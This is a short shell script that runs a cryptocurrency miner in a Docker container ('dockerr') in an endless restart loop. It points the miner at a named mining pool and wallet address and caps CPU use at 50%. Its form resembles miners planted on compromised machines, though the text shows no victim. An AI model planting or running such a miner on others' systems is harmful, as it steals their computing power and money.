#!/bin/sh
while [ 1 ]; do
	docker run dockerr -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x --max-cpu-usage=50 --no-color --print-time=6000 --donate-level=1
	sleep 5
done
